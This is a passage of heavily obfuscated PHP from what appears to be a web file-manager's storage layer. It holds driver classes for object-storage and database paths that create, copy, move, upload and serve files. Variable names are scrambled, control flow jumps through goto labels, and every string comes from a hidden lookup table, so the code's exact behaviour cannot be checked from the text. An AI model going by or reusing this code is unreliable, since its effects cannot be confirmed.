self::sourceID($CäÜä®§Æ÷); $CäÜä®§Æ÷ = self::make(Model($EòÓÄÚ‚‚[775])->mkdir($a¤Ê »œí‘, $EÓ—Ù³™ó)); } Model($EòÓÄÚ‚‚[1100])->set($D‘·ôµší, $CäÜä®§Æ÷); goto fäÓ÷µœ¹”; fäÓ÷µœ¹”: return $CäÜä®§Æ÷; goto D¨´‹ ‚–; FŞ÷·‹‹óÚ: $EòÓÄÚ‚‚ =& $_SERVER[Š‰]; $D‘·ôµší = $EòÓÄÚ‚‚[1152] . ucfirst($EÓ—Ù³™ó); $CäÜä®§Æ÷ = Model($EòÓÄÚ‚‚[1100])->get($D‘·ôµší); goto e±ÖÃ„—†»; D¨´‹ ‚–: } public static function systemFolder($fß®á¾†ç) { $cã¶ÑÃ‘‹Ñ = IO_PATH_SYSTEM_SOURCE . $fß®á¾†ç; $bÑàÑ‡½¯¼ = Cache::get($cã¶ÑÃ‘‹Ñ); if (!$bÑàÑ‡½¯¼) { $aŒ¢‚Î¼´Ä = IO::infoFull($cã¶ÑÃ‘‹Ñ); if (!$aŒ¢‚Î¼´Ä) { $bÑàÑ‡½¯¼ = IO::mkdir($cã¶ÑÃ‘‹Ñ, REPEAT_SKIP); } else { $bÑàÑ‡½¯¼ = $aŒ¢‚Î¼´Ä[$_SERVER[Š‰][75]]; } Cache::set($cã¶ÑÃ‘‹Ñ, $bÑàÑ‡½¯¼, 3600 * 10); } return $bÑàÑ‡½¯¼; } public static function defaultDriver() { return Model($_SERVER[Š‰][716])->defaultDriver(); } public static function defaultIO() { $aò—Á›ºÃ¼ =& $_SERVER[Š‰]; $FÀ±ƒùÑê­ = self::defaultDriver(); return $aò—Á›ºÃ¼[1153] . $FÀ±ƒùÑê­[$aò—Á›ºÃ¼[388]] . $aò—Á›ºÃ¼[1142]; } public static function defaultDriverInit() { static $Aí’øÚ‰À¬ = false; if ($Aí’øÚ‰À¬) { return $Aí’øÚ‰À¬; } $Aí’øÚ‰À¬ = IO::init(self::defaultIO()); return $Aí’øÚ‰À¬; } public static function fileTypeList() { $eª™¹™çö¶ =& $_SERVER[Š‰]; $A¯¯¬ŸÔÃ® = $GLOBALS[$eª™¹™çö¶[6]][$eª™¹™çö¶[1154]]; foreach ($A¯¯¬ŸÔÃ® as $DµœË®ç°´ => $döº²ªñÜæ) { $E·£Ğ¡ÖÌŠ = $eª™¹™çö¶[1155] . $DµœË®ç°´; $f•×ñåŒ­¡ = LNG($E·£Ğ¡ÖÌŠ); if ($E·£Ğ¡ÖÌŠ != $f•×ñåŒ­¡) { $A¯¯¬ŸÔÃ®[$DµœË®ç°´][$eª™¹™çö¶[28]] = $f•×ñåŒ­¡; } } return $A¯¯¬ŸÔÃ®; } public static function transferType($f’£àÇÔ¯ª, $CÁ™¥ÎÒ) { goto fÌ¬ÚøĞ¨; fÌ¬ÚøĞ¨: $C¥ÛĞªç  =& $_SERVER[Š‰]; $cé„Œ‰šÖ = self::driverType($f’£àÇÔ¯ª); $côÏ¹ßåí = self::driverType($CÁ™¥ÎÒ); goto fŞëøï“Ø¢; eÅÅ½ï»Ò: return $C¥ÛĞªç [1158]; goto F²÷±³’¼; fŞëøï“Ø¢: if ($cé„Œ‰šÖ[$C¥ÛĞªç [29]] == $côÏ¹ßåí[$C¥ÛĞªç [29]] && $cé„Œ‰šÖ[$C¥ÛĞªç [1156]] == $côÏ¹ßåí[$C¥ÛĞªç [1156]]) { return $C¥ÛĞªç [1157]; } if ($cé„Œ‰šÖ[$C¥ÛĞªç [29]] == $C¥ÛĞªç [808] && $côÏ¹ßåí[$C¥ÛĞªç [29]] == $C¥ÛĞªç [105]) { return $C¥ÛĞªç [1070]; } if ($cé„Œ‰šÖ[$C¥ÛĞªç [29]] == $C¥ÛĞªç [105] && $côÏ¹ßåí[$C¥ÛĞªç [29]] == $C¥ÛĞªç [808]) { return $C¥ÛĞªç [106]; } goto eÅÅ½ï»Ò; F²÷±³’¼: } public static function driverType($B©˜Ï»Ïë») { goto BÓ¼‡‰‰Òó; BÓ¼‡‰‰Òó: $fƒµäµòÊ— =& $_SERVER[Š‰]; $D³ŠÇŞÄ—‹ = $B©˜Ï»Ïë»->path; $cŠŒ°ŒÕ² = str_replace($fƒµäµòÊ—[1159], $fƒµäµòÊ—[33], strtolower($B©˜Ï»Ïë»->getType())); goto a‚Ä‹ÅãÉ§; aöÑ…ïğ´³: return array($fƒµäµòÊ—[29] => $fƒµäµòÊ—[808], $fƒµäµòÊ—[1156] => $B©˜Ï»Ïë»->pathDriver, $fƒµäµòÊ—[75] => $D³ŠÇŞÄ—‹); goto Aå“Ú ˜‚Ù; a‚Ä‹ÅãÉ§: if ($cŠŒ°ŒÕ² == $fƒµäµòÊ—[707] || $cŠŒ°ŒÕ² == $fƒµäµòÊ—[1160] || $cŠŒ°ŒÕ² == $fƒµäµòÊ—[1161]) { $B©˜Ï»Ïë» = self::defaultDriverInit(); } else { if ($cŠŒ°ŒÕ² == $fƒµäµòÊ—[1077] || $cŠŒ°ŒÕ² == $fƒµäµòÊ—[1162]) { $B©˜Ï»Ïë» = IO::init($B©˜Ï»Ïë»->pathParse[$fƒµäµòÊ—[1024]]); } } $cŠŒ°ŒÕ² = str_replace($fƒµäµòÊ—[1159], $fƒµäµòÊ—[33], strtolower($B©˜Ï»Ïë»->getType())); if ($cŠŒ°ŒÕ² == $fƒµäµòÊ—[105]) { return array($fƒµäµòÊ—[29] => $fƒµäµòÊ—[105], $fƒµäµòÊ—[1156] => $fƒµäµòÊ—[33], $fƒµäµòÊ—[75] => $D³ŠÇŞÄ—‹); } goto aöÑ…ïğ´³; Aå“Ú ˜‚Ù: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E¢ìŞçºÎ) { parent::__construct($E¢ìŞçºÎ); $this->signatureVersion($_SERVER[Š‰][210]); } public function uploadFormData($a¾‡ğ„í™ë, $a×Ã¾ÅˆŞ = 3600) { goto fÀ«‚œÁ…Œ; bù¯Ûâöß°: $e‚ŠùŸµïƒ = array($dèÔ•öš“‘[1165] => $D´ì–Ïğ¼, $dèÔ•öš“‘[1166] => array(array($dèÔ•öš“‘[1167] => $e¨ÄôÇ‘¹µ), array($dèÔ•öš“‘[1168] => $this->bucket), array($dèÔ•öš“‘[1169], $dèÔ•öš“‘[1170], $dèÔ•öš“‘[33]), array($dèÔ•öš“‘[1171] => $AŠñ‡¬ÂÈŠ), array($dèÔ•öš“‘[1172] => $aÚ‰¶¦‹æÜ), array($dèÔ•öš“‘[1173] => $this->accessKey), array($dèÔ•öš“‘[1174] => $C·²–‰šµ¬))); $e‚ŠùŸµïƒ = json_encode($e‚ŠùŸµïƒ); $a‰õÛİ»š§ = hash_hmac($dèÔ•öš“‘[228], $C·²–‰šµ¬, $this->secret); goto d¸ó¨’ô…¿; fÀ«‚œÁ…Œ: $dèÔ•öš“‘ =& $_SERVER[Š‰]; $e¨ÄôÇ‘¹µ = $dèÔ•öš“‘[191]; $aÚ‰¶¦‹æÜ = $dèÔ•öš“‘[228]; goto fÓÆ¬µëã‘; fÓÆ¬µëã‘: $AŠñ‡¬ÂÈŠ = $dèÔ•öš“‘[1163]; $D´ì–Ïğ¼ = gmdate($dèÔ•öš“‘[1164], time() + $a×Ã¾ÅˆŞ); $C·²–‰šµ¬ = (string) time() . $dèÔ•öš“‘[67] . (string) (time() + $a×Ã¾ÅˆŞ); goto bù¯Ûâöß°; fÑ³†óÅ†: return $B¹ùùÇ¹°²; goto b§¼ïŠİÎà; d¸ó¨’ô…¿: $Bå¦ë³‚ËÄ = sha1($e‚ŠùŸµïƒ); $e¸´Ü…¢Îİ = hash_hmac($dèÔ•öš“‘[228], $Bå¦ë³‚ËÄ, $a‰õÛİ»š§); $B¹ùùÇ¹°² = array($dèÔ•öš“‘[1167] => $e¨ÄôÇ‘¹µ, $dèÔ•öš“‘[1171] => $AŠñ‡¬ÂÈŠ, $dèÔ•öš“‘[1175] => base64_encode($e‚ŠùŸµïƒ), $dèÔ•öš“‘[1172] => $aÚ‰¶¦‹æÜ, $dèÔ•öš“‘[1173] => $this->accessKey, $dèÔ•öš“‘[1176] => $C·²–‰šµ¬, $dèÔ•öš“‘[1177] => $e¸´Ü…¢Îİ, $dèÔ•öš“‘[175] => $this->getHost()); goto fÑ³†óÅ†; b§¼ïŠİÎà: } public function fileOutLink($b•ö‚µòò) { $A¹Ù«í¼£ì =& $_SERVER[Š‰]; if (substr($b•ö‚µòò, 0, 7) == $A¹Ù«í¼£ì[1178]) { $b•ö‚µòò = $A¹Ù«í¼£ì[1179] . substr($b•ö‚µòò, 7); } header($A¹Ù«í¼£ì[158] . $b•ö‚µòò); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($bƒù·¿ÚÂ‰) { $this->pathParse = $bƒù·¿ÚÂ‰; $this->model = Model($_SERVER[Š‰][1180]); } public function getPath($E´ÒÎØƒ·) { return trim($E´ÒÎØƒ·, $_SERVER[Š‰][8]); } public function pathFather($a¹÷¦Ùº—) { $cİè„á¥ç = $this->parse($a¹÷¦Ùº—); $cİè„á¥ç = $this->infoSimple($a¹÷¦Ùº—); return $cİè„á¥ç ? $cİè„á¥ç[$_SERVER[Š‰][472]] : !1; } public function pathThis($B—™£ŠÏÜ¡) { $D‚ËõæïÑí = $this->infoSimple($B—™£ŠÏÜ¡); return $D‚ËõæïÑí ? $D‚ËõæïÑí[$_SERVER[Š‰][28]] : !1; } public function getPathOuter($a“‡æ¥‚½Ê) { if (!$a“‡æ¥‚½Ê) { return $a“‡æ¥‚½Ê; } $cÚœÀÔŠ‡¨ = $this->parse($a“‡æ¥‚½Ê); return KodIO::make($cÚœÀÔŠ‡¨[$_SERVER[Š‰][388]]); } public function copyFolderFromIO($Aˆ•Ğ¤‹›¼, $C‰¤Ÿ¼é­±, $b›®‘¯ö‡­, $C¤Ô›ÍÈòé, $BøŠŠØÃº°) { $A‹ŞšÍÓ‹ = $this->model->copyFolderFromIO($Aˆ•Ğ¤‹›¼, $C‰¤Ÿ¼é­±, $b›®‘¯ö‡­, $C¤Ô›ÍÈòé, $BøŠŠØÃº°); return KodIO::make($A‹ŞšÍÓ‹); } public function isParentOf($bµÌì—ÌÁ, $D‹ºå—ÎÎ…) { return $this->model->isParentOf($bµÌì—ÌÁ, $D‹ºå—ÎÎ…); } public function mkfile($eÇÖä¯«ë, $bîˆ™ÆÏŸª = '', $c›šæêÈÀ× = REPEAT_RENAME) { $bõôÑÊ­ù½ =& $_SERVER[Š‰]; $f†±Ğ¢ÁÙ¦ = $this->parse($eÇÖä¯«ë); $eÇÖä¯«ë = $f†±Ğ¢ÁÙ¦[$bõôÑÊ­ù½[388]]; for ($A„Õ¯Œ™ŠÃ = 0; $A„Õ¯Œ™ŠÃ < count($f†±Ğ¢ÁÙ¦[$bõôÑÊ­ù½[1181]]); $A„Õ¯Œ™ŠÃ++) { $E‰»ŒôÜŒ‹ = $f†±Ğ¢ÁÙ¦[$bõôÑÊ­ù½[1181]][$A„Õ¯Œ™ŠÃ]; if ($A„Õ¯Œ™ŠÃ == count($f†±Ğ¢ÁÙ¦[$bõôÑÊ­ù½[1181]]) - 1) { $eÇÖä¯«ë = $this->model->mkfile($eÇÖä¯«ë, $E‰»ŒôÜŒ‹, $bîˆ™ÆÏŸª, $c›šæêÈÀ×); break; } $eÇÖä¯«ë = $this->model->mkdir($eÇÖä¯«ë, $E‰»ŒôÜŒ‹, REPEAT_SKIP); } return $this->getPathOuter($eÇÖä¯«ë); } public function mkdir($AèåĞçÉ÷Î, $D‡õÈç¿Üí = REPEAT_SKIP) { $bù­ëçï³ =& $_SERVER[Š‰]; $aÎè¼àìŒÚ = $this->parse($AèåĞçÉ÷Î); $AèåĞçÉ÷Î = $aÎè¼àìŒÚ[$bù­ëçï³[388]]; for ($Aé…éÏ¾ô = 0; $Aé…éÏ¾ô < count($aÎè¼àìŒÚ[$bù­ëçï³[1181]]); $Aé…éÏ¾ô++) { $AÛç«×¡Œù = $aÎè¼àìŒÚ[$bù­ëçï³[1181]][$Aé…éÏ¾ô]; $AèåĞçÉ÷Î = $this->model->mkdir($AèåĞçÉ÷Î, $AÛç«×¡Œù, $D‡õÈç¿Üí); } return $this->getPathOuter($AèåĞçÉ÷Î); } public function copyFile($b ³’äŒ‚¡, $d¯Ùéí™—°, $DŒ ö„Ù„í = REPEAT_REPLACE) { $c©–°¨‚ =& $_SERVER[Š‰]; $cøˆ…÷Ò‹ = $this->parse($d¯Ùéí™—°); $C°Ğ—¯±… = $this->model->copy($b ³’äŒ‚¡, $cøˆ…÷Ò‹[$c©–°¨‚[388]], $DŒ ö„Ù„í, $cøˆ…÷Ò‹[$c©–°¨‚[75]]); return $C°Ğ—¯±… ? $this->getPathOuter($C°Ğ—¯±…) : !1; } public function moveFile($EŒÃÀ’è÷Ã, $bš¹Â¬óï«, $A¯çÒ¯Èõ® = REPEAT_REPLACE) { $fÚ„‡Ã‡‚£ =& $_SERVER[Š‰]; $bÉÓ«ŒÂâº = $this->parse($bš¹Â¬óï«); $aÂ¾ìÆˆ¸í = $this->model->move($EŒÃÀ’è÷Ã, $bÉÓ«ŒÂâº[$fÚ„‡Ã‡‚£[388]], $A¯çÒ¯Èõ®, $bÉÓ«ŒÂâº[$fÚ„‡Ã‡‚£[75]]); return $aÂ¾ìÆˆ¸í ? $this->getPathOuter($aÂ¾ìÆˆ¸í) : !1; } public function copy($AÂéÉêã…, $e—ÊñßÀ½, $a¡ïÚ§ã³ã = REPEAT_REPLACE) { $b»à¼œ‡ò“ = $this->parse($e—ÊñßÀ½); $F˜ÂÙÍ˜• = $this->model->copy($AÂéÉêã…, $b»à¼œ‡ò“[$_SERVER[Š‰][388]], $a¡ïÚ§ã³ã); return $F˜ÂÙÍ˜• ? $this->getPathOuter($F˜ÂÙÍ˜•) : !1; } public function moveSameAllow() { } public function move($BÄ¨Ë¬ç, $dôõìŠº¦Ê, $EµÏÁÀÑ¶ø = REPEAT_REPLACE) { $eŒ¬ÊğÉƒİ = $this->parse($dôõìŠº¦Ê); $c³ñÑÆ‚ª = $this->model->move($BÄ¨Ë¬ç, $eŒ¬ÊğÉƒİ[$_SERVER[Š‰][388]], $EµÏÁÀÑ¶ø); return $c³ñÑÆ‚ª ? $this->getPathOuter($c³ñÑÆ‚ª) : !1; } public function remove($a‹”‘£Ñ•‰, $ağ·£›Áñò = true) { return $this->model->remove($a‹”‘£Ñ•‰, $ağ·£›Áñò); } public function rename($AÎÕì£Îî, $bœë‰Ñ³‚ï) { $AÅÑÃ¹·’ = $this->model->rename($AÎÕì£Îî, $bœë‰Ñ³‚ï); return $AÅÑÃ¹·’ ? $this->getPathOuter($AÎÕì£Îî) : $AÅÑÃ¹·’; } public function size($EíÛµ”öÃ) { $AÄÒÛìã¨ = $this->infoSimple($EíÛµ”öÃ); return $AÄÒÛìã¨ ? $AÄÒÛìã¨[$_SERVER[Š‰][77]] : 0; } public function infoSimple($Cñì”¥¶Õ) { return $this->model->sourceInfo($Cñì”¥¶Õ); } public function info($a‡¾”ÆóÛ‘) { return $this->infoParse($a‡¾”ÆóÛ‘); } public function infoAuth($cÑ™ÄÔ‡¿ˆ) { return $this->infoParse($cÑ™ÄÔ‡¿ˆ, !1, !0); } public function infoWithChildren($a–‘ÍÜàôä) { return $this->infoParse($a–‘ÍÜàôä, !0); } protected function infoParse($C¹ˆ¾œŸ”™, $D‹âÁ…íˆ = false, $CÔ›˜¾á²É = false) { if (!$D‹âÁ…íˆ) { return $this->model->pathInfo($C¹ˆ¾œŸ”™, $CÔ›˜¾á²É); } return $this->model->pathInfoMore($C¹ˆ¾œŸ”™); } public function infoFull($bùÜŞ˜éŸ”) { $Cæ¾‹‹äƒ =& $_SERVER[Š‰]; $E´Çñ”ÇğÙ = explode($Cæ¾‹‹äƒ[8], $bùÜŞ˜éŸ”); $bŠ‡½Ÿ°á« = implode($Cæ¾‹‹äƒ[8], array_splice($E´Çñ”ÇğÙ, 1)); return $this->model->pathInfoByPath($E´Çñ”ÇğÙ[0], $bŠ‡½Ÿ°á«); } public function hashSimple($dæÌš·Í†¥) { $dÙ¬¶µÉ½ =& $_SERVER[Š‰]; $däªÙÌì¹ = $this->infoWithChildren($dæÌš·Í†¥); return $däªÙÌì¹[$dÙ¬¶µÉ½[163]][$dÙ¬¶µÉ½[170]]; } public function hashMd5($D ´Ø Ê¿á) { $C¿ôì°†Ğä =& $_SERVER[Š‰]; $D…—½”÷„ = $this->infoWithChildren($D ´Ø Ê¿á); return $D…—½”÷„[$C¿ôì°†Ğä[163]][$C¿ôì°†Ğä[169]]; } public function exist($a‰­Â°áÏà) { $däôÓİáØ =& $_SERVER[Š‰]; $e„Â÷æ‹ğŸ = $this->parse($a‰­Â°áÏà); if (!$e„Â÷æ‹ğŸ[$däôÓİáØ[75]]) { return $this->isFile($a‰­Â°áÏà) || $this->isFolder($a‰­Â°áÏà); } $e‰¶ë¶ù‘ = array($däôÓİáØ[389] => $e„Â÷æ‹ğŸ[$däôÓİáØ[388]], $däôÓİáØ[28] => $e„Â÷æ‹ğŸ[$däôÓİáØ[75]]); $eÚİÊ•à = $this->model->where($e‰¶ë¶ù‘)->find(); return $eÚİÊ•à ? !0 : !1; } public function isFile($bæ‰ğÖ©Œ) { $BÒ…ª•˜‚Œ =& $_SERVER[Š‰]; $D©Ì®£™Ø = $this->infoSimple($bæ‰ğÖ©Œ); return $D©Ì®£™Ø && $D©Ì®£™Ø[$BÒ…ª•˜‚Œ[397]] == $BÒ…ª•˜‚Œ[86] ? !1 : !0; } public function isFolder($BÍæËÂÁİó) { $Dæ”¬»ñõ† =& $_SERVER[Š‰]; $aÆÂÙ¾ØØò = $this->infoSimple($BÍæËÂÁİó); return $aÆÂÙ¾ØØò && $aÆÂÙ¾ØØò[$Dæ”¬»ñõ†[397]] == $Dæ”¬»ñõ†[86] ? !0 : !1; } public function listPath($fƒÆ¾“ª›ß, $ağ¿®Šò‹ = false) { $c”ğ¸ĞÏğ‡ =& $_SERVER[Š‰]; if ($fƒÆ¾“ª›ß == $c”ğ¸ĞÏğ‡[33]) { return !1; } $f£Ä±áª = array($c”ğ¸ĞÏğ‡[389] => $fƒÆ¾“ª›ß); if ($ağ¿®Šò‹) { return $this->model->listSource($f£Ä±áª, -1); } return $this->model->listSource($f£Ä±áª); } public function has($D›ÀÕù«’, $EŠõ¼„‘ŸÇ = false, $Cù®±Õ©¸ƒ = null) { $FÓƒ¿ƒ©Ğ =& $_SERVER[Š‰]; $F‡Ì†°‰Ÿ = $this->infoWithChildren($D›ÀÕù«’); if ($EŠõ¼„‘ŸÇ) { return array($FÓƒ¿ƒ©Ğ[202] => $F‡Ì†°‰Ÿ[$FÓƒ¿ƒ©Ğ[202]], $FÓƒ¿ƒ©Ğ[201] => $F‡Ì†°‰Ÿ[$FÓƒ¿ƒ©Ğ[201]]); } return $Cù®±Õ©¸ƒ ? $F‡Ì†°‰Ÿ[$FÓƒ¿ƒ©Ğ[202]] : $F‡Ì†°‰Ÿ[$FÓƒ¿ƒ©Ğ[201]]; } public function listAll($D¤šà†« ˆ) { $a®»·ïÚåŒ = IO::info($this->pathParse[$_SERVER[Š‰][75]]); if (!$a®»·ïÚåŒ) { return array(); } return $this->model->listAll($D¤šà†« ˆ); } public function getContent($E‹ó¤âİ) { return $this->model->getContent($E‹ó¤âİ); } public function setContent($bô·Ö³¥­Ÿ, $CĞ¥†• ğ = '') { return $this->model->setContent($bô·Ö³¥­Ÿ, $CĞ¥†• ğ); } public function fileSubstr($aÃ‚ñ£»’â, $D±ƒ»Œ½×ñ, $aÕˆÍÕè„) { return $this->model->fileSubstr($aÃ‚ñ£»’â, $D±ƒ»Œ½×ñ, $aÕˆÍÕè„); } public function download($Fã·Ò†Ñ½, $F¢šñ‡ÂÓ = '') { $Aéëš†®Õ = get_path_father($F¢šñ‡ÂÓ); $Fï£±¡Ï = get_path_this($F¢šñ‡ÂÓ); $bŸ¡§¦ÚìŠ = $this->model->fileInfoGet($Fã·Ò†Ñ½); $F½ÅŞÅßâá = IO::copy($bŸ¡§¦ÚìŠ[$_SERVER[Š‰][75]], $Aéëš†®Õ, !1, $Fï£±¡Ï); return $F½ÅŞÅßâá; } public function setModifyTime($B‹î‹é‘¹é, $eÚ±™“ùÇö = '') { $this->model->metaSet($B‹î‹é‘¹é, $_SERVER[Š‰][1182], $eÚ±™“ùÇö); } public function upload($EïÔâÔàÃ±, $b’Î„“©, $C¦…îöîî¢ = false, $Cò¬•Ş…ñÁ = REPEAT_REPLACE) { $b¶«õˆ‚´— =& $_SERVER[Š‰]; $eÆªî‹ÆÈ¹ = $this->parse($EïÔâÔàÃ±); $cñ®»Üºï¯ = $this->model->addFile($eÆªî‹ÆÈ¹[$b¶«õˆ‚´—[388]], $b’Î„“©, $eÆªî‹ÆÈ¹[$b¶«õˆ‚´—[75]], $C¦…îöîî¢, $Cò¬•Ş…ñÁ); return $this->getPathOuter($cñ®»Üºï¯); } public function uploadFileByID($f¿ÄùÙ°„, $dÚ©ÄÒ»ùß, $BÑíÄ¯) { $Fõá·ì÷Ú› =& $_SERVER[Š‰]; $dÛŒĞ’ºâ = $this->parse($f¿ÄùÙ°„); $cİ‹ãô° = $this->model->addFileByFileID($dÛŒĞ’ºâ[$Fõá·ì÷Ú›[388]], $dÚ©ÄÒ»ùß, $dÛŒĞ’ºâ[$Fõá·ì÷Ú›[75]], $BÑíÄ¯); return $this->getPathOuter($cİ‹ãô°); } public function addFileByRemote($dºé¯Ã³Ü, $B‚Î„•­Å, $e«Ôê£ÍçÈ = array(), $A­Ÿ¤¼‚¿· = '', $BöêÄ¥Çë¼) { $EÇÊˆ·Œ¶¢ =& $_SERVER[Š‰]; $b‰ç‘Ş—î = $this->parse($dºé¯Ã³Ü); $A­Ÿ¤¼‚¿· = empty($A­Ÿ¤¼‚¿·) ? $b‰ç‘Ş—î[$EÇÊˆ·Œ¶¢[75]] : $A­Ÿ¤¼‚¿·; $A™ÃÑ·ŠÁ‘ = $this->model->addFileByRemote($b‰ç‘Ş—î[$EÇÊˆ·Œ¶¢[388]], $B‚Î„•­Å, $A­Ÿ¤¼‚¿·, $e«Ôê£ÍçÈ, $BöêÄ¥Çë¼); return $this->getPathOuter($A™ÃÑ·ŠÁ‘); } public function uploadLink($dŸ¤¦»Á¿ˆ, $D¢àÖÑ­ = 0) { $bŠÍíƒäÔ± =& $_SERVER[Š‰]; $B¬Ä¡‹½òß = $this->parse($dŸ¤¦»Á¿ˆ); $dŸ¤¦»Á¿ˆ = Model($bŠÍíƒäÔ±[566])->createFileName($B¬Ä¡‹½òß[$bŠÍíƒäÔ±[75]]); $FËù¥â«… = IO::uploadLink($dŸ¤¦»Á¿ˆ, $D¢àÖÑ­); return $FËù¥â«…; } public function fileNameAuto($D¯ï×•†™†, $B¦ÏÔã¸Œ, $BØ“£Êµ = REPEAT_REPLACE, $c‘Àã«àÛ = false) { return $this->model->fileNameAuto($D¯ï×•†™†, $B¦ÏÔã¸Œ, $BØ“£Êµ, $c‘Àã«àÛ); } public function fileNameExist($d‰Ø¶½˜Ü‡, $aØ²Íõ‘±) { return $this->model->fileNameExist($d‰Ø¶½˜Ü‡, $aØ²Íõ‘±); } protected function _fileOut($cŸ‰ÎÁƒ‰‡, $BäßâñöÏ” = false, $DÄ—Ò¥¸£ = false, $D®éÌ»‡§’ = '', $C£×ï·Å°‘ = false) { goto DÇƒÏ”äâ; DÇƒÏ”äâ: $E¶ôßÕò…Ğ =& $_SERVER[Š‰]; $a±Ş›×™Š = $this->model->sourceInfo($cŸ‰ÎÁƒ‰‡); if ($a±Ş›×™Š[$E¶ôßÕò…Ğ[397]] == $E¶ôßÕò…Ğ[86]) { header($E¶ôßÕò…Ğ[1183]); die; } goto Fô¡¹ƒ²¡; Fô¡¹ƒ²¡: $f›•·¾ÉÓ = $this->model->fileInfoGet($cŸ‰ÎÁƒ‰‡); $D®éÌ»‡§’ = $f›•·¾ÉÓ[$E¶ôßÕò…Ğ[169]] ? $f›•·¾ÉÓ[$E¶ôßÕò…Ğ[169]] : $D®éÌ»‡§’; $C×Ïªî½¸ = isset($GLOBALS[$E¶ôßÕò…Ğ[1184]]) ? $GLOBALS[$E¶ôßÕò…Ğ[1184]] : $a±Ş›×™Š[$E¶ôßÕò…Ğ[28]]; goto böƒÀ¾š—ª; böƒÀ¾š—ª: if ($C£×ï·Å°‘) { return IO::fileOutServer($f›•·¾ÉÓ[$E¶ôßÕò…Ğ[75]], $BäßâñöÏ”, $C×Ïªî½¸, $D®éÌ»‡§’); } IO::fileOut($f›•·¾ÉÓ[$E¶ôßÕò…Ğ[75]], $BäßâñöÏ”, $C×Ïªî½¸, $D®éÌ»‡§’); goto eãîëÍ¹±“; eãîëÍ¹±“: } public function fileOut($A•ãøé¤”ˆ, $eÈø´íì© = false, $b‘¶µ‘é‹é = false, $bÖÇ”‰òµ¥ = '') { $this->_fileOut($A•ãøé¤”ˆ, $eÈø´íì©, $b‘¶µ‘é‹é, $bÖÇ”‰òµ¥); } public function fileOutServer($B‘…°—÷ó, $Aîßƒ‹¾µ÷ = false, $d»ˆÒÃ›ï— = false, $A„êºĞÊç = '') { $this->_fileOut($B‘…°—÷ó, $Aîßƒ‹¾µ÷, $d»ˆÒÃ›ï—, $A„êºĞÊç, !0); } protected function _fileOutImage($f”¾Ş×ÒªŒ, $då†´²ù»ç = 250) { goto f¹™‰™ŸñÍ; aõî˜ØÆ–«: $Fª¬Æ…éƒä = $this->model->fileInfoGet($f”¾Ş×ÒªŒ); $Fª¬Æ…éƒä[$cêÉ²’îÛ [28]] = $AÒÄ¬Š ³Œ[$cêÉ²’îÛ [28]]; $Fª¬Æ…éƒä[$cêÉ²’îÛ [162]] = $AÒÄ¬Š ³Œ[$cêÉ²’îÛ [162]]; goto açÚã§¹Ë„; f¹™‰™ŸñÍ: $cêÉ²’îÛ  =& $_SERVER[Š‰]; $AÒÄ¬Š ³Œ = $this->model->pathInfo($f”¾Ş×ÒªŒ); if ($AÒÄ¬Š ³Œ[$cêÉ²’îÛ [397]] == $cêÉ²’îÛ [86]) { show_json($cêÉ²’îÛ [1185] . $f”¾Ş×ÒªŒ, !1); } goto aõî˜ØÆ–«; açÚã§¹Ë„: $GLOBALS[$cêÉ²’îÛ [1184]] = $Fª¬Æ…éƒä[$cêÉ²’îÛ [28]]; $GLOBALS[$cêÉ²’îÛ [161]] = $Fª¬Æ…éƒä; IO::fileOutImage($Fª¬Æ…éƒä[$cêÉ²’îÛ [75]], $då†´²ù»ç); goto C˜Î¥”ßğ‘; C˜Î¥”ßğ‘: } public function fileOutImage($DÔã¸ºÙïÍ, $cÍ˜Š¿—Éæ = 250) { $this->_fileOutImage($DÔã¸ºÙïÍ, $cÍ˜Š¿—Éæ); } public function fileOutImageServer($bŠ´¯×², $aÃêÈè“—š = 250) { $this->_fileOutImage($bŠ´¯×², $aÃêÈè“—š); } public function link($D ¼Ëƒã…, $A‹µ„²²¹ = '') { $a•³µ£ğ™½ = $this->model->fileInfoGet($D ¼Ëƒã…); return IO::link($a•³µ£ğ™½[$_SERVER[Š‰][75]], $A‹µ„²²¹); } protected function parse($E°ñšß›¼‚) { $A™™ì£ î² =& $_SERVER[Š‰]; if (strstr($E°ñšß›¼‚, $A™™ì£ î²[8]) === !1) { return array($A™™ì£ î²[406] => intval($E°ñšß›¼‚), $A™™ì£ î²[75] => $A™™ì£ î²[33], $A™™ì£ î²[1181] => array()); } $Cå…¾›â“ = explode($A™™ì£ î²[8], trim($E°ñšß›¼‚, $A™™ì£ î²[8])); if (count($Cå…¾›â“) < 2) { show_tips($E°ñšß›¼‚ . $A™™ì£ î²[1186]); } return array($A™™ì£ î²[406] => intval($Cå…¾›â“[0]), $A™™ì£ î²[75] => $Cå…¾›â“[1], $A™™ì£ î²[1181] => array_slice($Cå…¾›â“, 1)); } } goto BëŒ‘ÂŸù; bø¬¤¤Êó: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($A¯Ø‚Ì¥ Ë) { goto DêÙİÆÌ°¦; cä Ò²‡„¢: if (!$CÅËÁ˜ã•„[$C³¨î©Ö’[167]]) { $B¢—ßâ‡ì¿ = array_to_keyvalue($f•ï²œ´Ô­, $C³¨î©Ö’[33], $C³¨î©Ö’[167]); $fĞ’Ûª = implode($C³¨î©Ö’[47], $B¢—ßâ‡ì¿); $b˜ìÖµÀ¡Œ = $C³¨î©Ö’[1904]; } $a¯¢Íé»Ó¾ = explode($C³¨î©Ö’[47], trim($fĞ’Ûª, $C³¨î©Ö’[47])); return array($b˜ìÖµÀ¡Œ, $a¯¢Íé»Ó¾); goto Cë‹åïôª; EçÎáêÈç: if (!$CÅËÁ˜ã•„) { return array(); } $fĞ’Ûª = $CÅËÁ˜ã•„[$C³¨î©Ö’[167]]; $b˜ìÖµÀ¡Œ = $C³¨î©Ö’[7]; goto cä Ò²‡„¢; DêÙİÆÌ°¦: $C³¨î©Ö’ =& $_SERVER[Š‰]; $f•ï²œ´Ô­ = KodIO::fileTypeList(); $CÅËÁ˜ã•„ = $f•ï²œ´Ô­[$A¯Ø‚Ì¥ Ë]; goto EçÎáêÈç; Cë‹åïôª: } public function listPathType($aîİºìØ·—) { $C‘ò„ö¸Ä =& $_SERVER[Š‰]; $E»ÙáÉ£šß = $this->fileTypeWhere($aîİºìØ·—); if (!$E»ÙáÉ£šß) { return array(); } $f•Ëë–¯ = array($C‘ò„ö¸Ä[544] => SourceModel::TYPE_USER, $C‘ò„ö¸Ä[545] => USER_ID, $C‘ò„ö¸Ä[541] => 0, $C‘ò„ö¸Ä[542] => $E»ÙáÉ£šß); return $this->listSource($f•Ëë–¯); } public function 